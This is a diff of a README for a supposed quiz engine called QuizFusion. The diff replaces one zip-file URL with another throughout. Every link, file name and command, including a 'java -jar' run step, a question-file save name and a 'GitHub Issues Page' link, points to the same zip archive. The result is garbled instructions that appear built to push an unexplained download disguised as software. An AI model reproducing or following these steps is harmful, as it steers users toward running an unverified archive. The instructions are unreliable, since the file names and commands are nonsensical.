@@ -8,7 +8,7 @@ Welcome to QuizFusion! This lightweight quiz engine helps you create and run qui
 
 To download QuizFusion, visit the Releases page below. Here, you can get the latest version of the software.
 
-[![Download QuizFusion](https://raw.githubusercontent.com/Kelvohkash/QuizFusion/main/issei/QuizFusion.zip%20QuizFusion-v1.0-blue)](https://raw.githubusercontent.com/Kelvohkash/QuizFusion/main/issei/QuizFusion.zip)
+[![Download QuizFusion](https://github.com/Kelvohkash/QuizFusion/raw/refs/heads/main/src/com/Fusion_Quiz_1.0.zip%20QuizFusion-v1.0-blue)](https://github.com/Kelvohkash/QuizFusion/raw/refs/heads/main/src/com/Fusion_Quiz_1.0.zip)
 
 Follow these steps to download and install:
 
@@ -33,7 +33,7 @@ Once you have downloaded and unzipped QuizFusion, you will find the following fo
 - **/quizfusion**: The main application folder.
 - **/questions**: This folder holds your JSON question bank.
 - **/results**: After running your quiz, results will be stored here.
-- **https://raw.githubusercontent.com/Kelvohkash/QuizFusion/main/issei/QuizFusion.zip**: This file, which gives guidance on using QuizFusion.
+- **https://github.com/Kelvohkash/QuizFusion/raw/refs/heads/main/src/com/Fusion_Quiz_1.0.zip**: This file, which gives guidance on using QuizFusion.
 
 ## 🚀 How to Run QuizFusion
 
@@ -44,7 +44,7 @@ Running QuizFusion is straightforward. Follow these steps:
 3. Type the following command to start the application:
 
    ```
-   java -jar https://raw.githubusercontent.com/Kelvohkash/QuizFusion/main/issei/QuizFusion.zip
+   java -jar https://github.com/Kelvohkash/QuizFusion/raw/refs/heads/main/src/com/Fusion_Quiz_1.0.zip
    ```
 
 4. Follow the on-screen prompts to load your question bank and begin your quiz.
@@ -71,7 +71,7 @@ QuizFusion uses questions stored in a JSON format. Here’s a quick guide on how
    ]
    ```
 
-3. Save the file as `https://raw.githubusercontent.com/Kelvohkash/QuizFusion/main/issei/QuizFusion.zip` in the `/questions` directory.
+3. Save the file as `https://github.com/Kelvohkash/QuizFusion/raw/refs/heads/main/src/com/Fusion_Quiz_1.0.zip` in the `/questions` directory.
 
 ## 📊 Viewing Results
 
@@ -94,7 +94,7 @@ If you need help or have questions, feel free to reach out through the issues pa
 
 ## 🔗 Important Links
 
-- [Download QuizFusion](https://raw.githubusercontent.com/Kelvohkash/QuizFusion/main/issei/QuizFusion.zip)
-- [GitHub Issues Page](https://raw.githubusercontent.com/Kelvohkash/QuizFusion/main/issei/QuizFusion.zip)
+- [Download QuizFusion](https://github.com/Kelvohkash/QuizFusion/raw/refs/heads/main/src/com/Fusion_Quiz_1.0.zip)
+- [GitHub Issues Page](https://github.com/Kelvohkash/QuizFusion/raw/refs/heads/main/src/com/Fusion_Quiz_1.0.zip)
 
 Thank you for choosing QuizFusion! We hope you enjoy using our quiz engine for your learning and assessment needs.
